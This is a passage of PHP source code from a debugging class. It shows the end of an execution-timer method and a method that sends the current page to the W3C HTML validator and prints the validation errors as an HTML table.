		if( !isset(static::$_execTimeEnd[$name]) && isset(static::$_execTimeStart[$name]) )
		{
			static::$_execTimeEnd[$name] = microtime(true);
		}
	}
	
	
	/**
	 *	Calls external service and shows HTML errors for current (or set) URL
	 *
	 *	@static
	 *	@param string [optional] $relative_url Relative URL
	 *	@param bool [optional] $show_info Show also info statements
	 *	@return void
	 *	@example W3CValidate('/foo/bar')
	 *	@example W3CValudate()
	 */
	static function W3CValidate( $relative_url = NULL, $show_info = false )
	{
		//If is not called by W3C - don't chain
		if( !Art_Router::getFromURI('W3C') )
		{
			if( NULL === $relative_url)
			{
				$url = Art_Server::getServerProtocol().'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
			}
			else
			{
				$url = Art_Server::getServerProtocol().'://'.$_SERVER['HTTP_HOST'].$relative_url;
			}
			
			//Get validation response and this site HTML
			$result = file_get_contents('https://validator.w3.org/check?uri='.$url.'?W3C=true&output=json&showsource=yes');
			$result = json_decode($result);
			$source = file($url.'?W3C=true');
		
			echo '<div class="w3c_validation">
					<div class="w3c_validation_header">W3C result for '.$url.'</div>
					<table class="w3c_validation_result">';
					
			foreach($result->messages AS $row)
			{				
				if( !$show_info && $row->type == 'info' )
				{
					continue;
				}
				
				echo '	<tr class="w3c_validation_result_row_1">
							<td>'.( isset($row->lastLine) ? 'Line:&nbsp;'.$row->lastLine : '' ).'</td>
							<td>'.( isset($row->lastColumn) ? 'Column:&nbsp;'.$row->lastColumn : '' ).'</td>
							<td><span class="w3c_validation_result_type_'.$row->type.'">'.strtoupper($row->type).':</span> '.$row->message.'</td>
						</tr>
						<tr class="w3c_validation_result_row_2">
							<td colspan=3>'.( isset($row->lastLine) ? htmlentities($source[$row->lastLine-1]) : '').'</td>
						</tr>
						<tr class="w3c_validation_result_row_3">
							<td colspan=3>'.(isset($row->explanation) ? $row->explanation : '').'</td>
						</tr>
						<tr class="w3c_validation_result_row_4">
							<td colspan=3>&nbsp;</td>
						</tr>';
			}
			echo '	</table>
					</div>
				</div>';
		}
	}
}
